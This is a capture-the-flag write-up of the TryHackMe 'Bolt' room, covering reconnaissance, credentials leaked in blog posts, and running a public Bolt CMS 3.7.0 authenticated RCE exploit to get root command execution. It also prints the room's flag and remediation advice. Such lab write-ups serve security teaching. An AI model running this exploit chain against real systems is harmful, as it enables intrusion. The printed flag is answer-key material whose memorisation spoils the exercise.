# Bolt | TryHackMe Write-up

> **TL;DR:** Fingerprinted a Bolt CMS instance on port 8000, recovered admin credentials that were leaked in two of the site's own blog posts, then used the Bolt 3.7.0 authenticated RCE exploit (EDB-48296) to gain command execution. Because the CMS was running as root, the exploit dropped straight into a root context — the box has no separate privilege-escalation stage.

|  |  |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Bolt](https://tryhackme.com/room/bolt) |
| **Difficulty** | Easy |
| **Category** | Web · CMS exploitation |
| **Date completed** | 2026-07-16 |
| **Author** | Kevin Jose |

**Tools used:** `nmap` · `gobuster` · `searchsploit` · Bolt CMS RCE exploit (EDB-48296) · Metasploit (searched)
**Vulnerabilities covered:** Credentials disclosed in web content (CWE-200 / CWE-522) · Bolt CMS 3.7.0 authenticated RCE (EDB-48296) · web application running as root / excessive privilege (CWE-250)

---

## 1. Overview

Bolt is an Easy-rated web box built around the Bolt CMS, with a single flag as the objective. The path is short but realistic: the CMS is exposed on a non-standard port, the site's own content leaks the administrator's username and password, and those credentials unlock a known authenticated RCE in Bolt 3.7.0. The notable twist is that the web application runs as `root`, so code execution through the CMS is immediately root-level — there is no dedicated privilege-escalation step.

> **Note:** TryHackMe assigns a fresh IP each time the machine is deployed, so the target address differs between screenshots. Commands below use `$IP` as a placeholder — set it once per session with `export IP=<machine-ip>` and every command resolves automatically. The CMS listens on port 8000, so web commands target `$IP:8000`.

---

## 2. Reconnaissance

**Service scan**

```bash
nmap -sV $IP
```

Key findings — **3 open ports**:

- **22/tcp** — OpenSSH 7.6p1 (Ubuntu)
- **80/tcp** — Apache httpd 2.4.29 (Ubuntu)
- **8000/tcp** — HTTP, PHP 7.2.32. Nmap's service fingerprint of this port exposed **Bolt CMS** (page title "Bolt", "Bolt is unleashed"), making this the application of interest.

---

## 3. Enumeration

### Content discovery — ports 80 and 8000

```bash
gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,bak
gobuster dir -u http://$IP:8000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,bak
```

Port 80 returned almost nothing of use. The Bolt application on port 8000 exposed `/index.php`, `/search` and `/pages`.

### Browsing the CMS — credential disclosure

The compromise starts in the site's own content. Two blog posts, both written by the admin, leak his credentials:

- **"Message From Admin"** — the admin introduces himself as *Jake* and states his username is **`bolt`**.
- **"Message for IT Department"** — the same admin posts his password in plaintext: **`boltadmin123`**.

Recovered credentials: **`bolt : boltadmin123`**

### Identifying the exploit

```bash
searchsploit cms | grep -i bolt
```

This returned **Bolt CMS 3.7.0 - Authenticated Remote Code Execution** (`php/webapps/48296.py`). A matching Metasploit module (`exploit/unix/webapp/bolt_authenticated_rce`) also exists. The installed version was confirmed as Bolt 3.7.x via the application's `composer.lock`.

---

## 4. Exploitation — Initial Foothold

**Vulnerability:** Bolt CMS 3.7.0 authenticated RCE — **EDB-48296**

**Why it works:** With valid admin credentials, the exploit logs into Bolt, retrieves the login/CSRF token, and abuses the CMS's session handling to inject and execute PHP (session injection), yielding arbitrary command execution on the underlying host.

**Steps**

Run the exploit against the CMS, passing the recovered credentials:

```bash
python3 bolt_cms_arce.py http://$IP:8000 bolt boltadmin123
```

The script authenticates, confirms the session-injection primitive, and drops into an interactive command prompt. Confirming the context:

```
Enter OS command , for exit "quit" :: whoami
root
Enter OS command , for exit "quit" :: id
uid=0(root) gid=0(root) groups=0(root)
```

**Result:** Arbitrary command execution **as root**, directly from the CMS exploit.

---

## 5. Privilege Escalation

No separate privilege escalation was required. The Bolt CMS — and therefore the PHP process the exploit runs within — was executing as the **root** user, so the authenticated RCE in Section 4 already provided `uid=0`. This is itself the critical misconfiguration on the box: running a web application as root collapses the usual foothold-then-escalate path into a single step.

The root context was then used to locate and read the flag:

```
Enter OS command , for exit "quit" :: ls -la /home
Enter OS command , for exit "quit" :: cat /home/flag.txt
```

**Flag:** `/home/flag.txt` → `THM{wh0_d035nt_l0ve5_b0l7_r1gh77}`

---

## 6. Remediation

| Finding | Risk | Remediation |
|---|---|---|
| Admin credentials posted in site content | Trivial account takeover | Never place secrets in content/posts; rotate the exposed password; enforce policy against sharing credentials in plaintext. |
| Bolt CMS 3.7.0 authenticated RCE (EDB-48296) | Remote code execution | Upgrade Bolt to a patched release; restrict admin-panel access; use strong, unique admin credentials and MFA. |
| Web application running as root | Any web compromise becomes full system compromise | Run the web/CMS service under a dedicated low-privilege account; apply least privilege and filesystem restrictions. |
| CMS exposed on port 8000 without restriction | Increased attack surface | Place admin interfaces behind authentication/VPN or IP allow-listing; remove unnecessary public exposure. |

---

## 7. Lessons Learned

- Content is part of the attack surface — the entire compromise started with credentials an administrator posted in a blog entry. Enumerating what an application *says*, not just its directories, matters.
- "Authenticated" RCE is still critical when credentials are weak or exposed; the authentication requirement offered no real protection here.
- Running a service as root turns a single application bug into full host compromise — a clean illustration of why least privilege matters on the defensive side.

---

## 8. References

- Room: https://tryhackme.com/room/bolt
- Bolt CMS 3.7.0 Authenticated RCE — Exploit-DB 48296: https://www.exploit-db.com/exploits/48296
- CWE-250: Execution with Unnecessary Privileges — https://cwe.mitre.org/data/definitions/250.html
- CWE-522: Insufficiently Protected Credentials — https://cwe.mitre.org/data/definitions/522.html

---

*Lab conducted in an authorised, isolated training environment (TryHackMe). All activity was performed against systems I am explicitly permitted to test.*
